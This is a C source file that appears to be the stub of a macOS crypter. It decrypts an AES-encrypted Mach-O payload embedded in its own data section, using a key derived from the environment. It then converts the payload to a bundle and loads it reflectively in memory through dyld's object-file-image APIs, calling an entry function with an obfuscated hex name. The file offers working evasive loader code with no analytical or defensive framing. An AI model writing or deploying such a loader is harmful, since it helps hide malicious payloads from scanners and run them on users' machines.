#include "../asm/crypt/enc.h"
#include "../asm/crypt/bind.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>

__attribute__((visibility("default")))
int main(int argc, char **argv);
#include <unistd.h>

extern unsigned char _enc_start[] __asm__("section$start$__DATA$__rsrc");
extern unsigned char _enc_end[] __asm__("section$end$__DATA$__rsrc");

/* Reflective loader */
#include <mach-o/dyld.h>

extern NSObjectFileImageReturnCode NSCreateObjectFileImageFromMemory(const void *address, size_t size, NSObjectFileImage *objectFileImage);
extern NSModule NSLinkModule(NSObjectFileImage objectFileImage, const char *moduleName, uint32_t options);
extern NSSymbol NSLookupSymbolInModule(NSModule module, const char *symbolName);
extern void *NSAddressOfSymbol(NSSymbol symbol);

#define NSLINKMODULE_OPTION_RETURN_ON_ERROR 0x4
#define NSLINKMODULE_OPTION_PRIVATE 0x2

/* Get stub's own __text section */
static int get_stub_text(uint8_t **code, size_t *len) {
    /* Use _dyld_get_image_header(0) */
    const struct mach_header_64 *mh = (void *)_dyld_get_image_header(0);
    if (!mh || mh->magic != MH_MAGIC_64) return 0;
    
    
    uint8_t *p = (uint8_t *)mh + sizeof(*mh);
    for (uint32_t i = 0; i < mh->ncmds; i++) {
        struct load_command *lc = (void *)p;
        if (lc->cmd == LC_SEGMENT_64) {
            struct segment_command_64 *seg = (void *)p;
            if (!strcmp(seg->segname, "__TEXT")) {
                struct section_64 *s = (void *)(p + sizeof(*seg));
                for (uint32_t j = 0; j < seg->nsects; j++) {
                    if (!strcmp(s[j].sectname, "__text")) {
                        /* Copy to readable buffer */
                        *len = s[j].size;
                        *code = malloc(*len);
                        if (!*code) return 0;
                        memcpy(*code, (void *)s[j].addr, *len);
                        return 1;
                    }
                }
            }
        }
        p += lc->cmdsize;
    }
    return 0;
}

int main(int argc, char **argv) {
    
    size_t enc_sz = _enc_end - _enc_start;
    if (enc_sz == 0) return 1;

    uint8_t key[16], iv[16];
    derive_env_key(key, iv);
    
    
    uint8_t *decrypted = NULL;
    size_t dec_len = aes_decrypt(_enc_start, enc_sz, key, iv, &decrypted);
    if (!decrypted || dec_len == 0) return 1;
    
    /* Verify Mach-O and change to MH_BUNDLE */
    struct mach_header_64 *mh = (void *)decrypted;
    if (mh->magic != MH_MAGIC_64) {
        free(decrypted);
        return 1;
    }
    
    if (mh->filetype == MH_DYLIB) {
        mh->filetype = MH_BUNDLE;
    }
    
    /* Load using Apple's dyld APIs */
    NSObjectFileImage image;
    if (NSCreateObjectFileImageFromMemory(decrypted, dec_len, &image) != NSObjectFileImageSuccess) {
        free(decrypted);
        return 1;
    }
    
    NSModule module = NSLinkModule(image, "bundle", NSLINKMODULE_OPTION_RETURN_ON_ERROR | NSLINKMODULE_OPTION_PRIVATE);
    if (!module) {
        free(decrypted);
        return 1;
    }
    
    
    NSSymbol symbol = NSLookupSymbolInModule(module, "___8d3942b93e489c7a");
    if (!symbol) {
        free(decrypted);
        return 1;
    }
    
    typedef int (*__8d3942b93e489c7a_t)(int, char**);
    __8d3942b93e489c7a_t __8d3942b93e489c7a = (__8d3942b93e489c7a_t)NSAddressOfSymbol(symbol);
    if (!__8d3942b93e489c7a) {
        free(decrypted);
        return 1;
    }
    
    
    int ret = __8d3942b93e489c7a(argc, argv);
    free(decrypted);
    return ret;
}
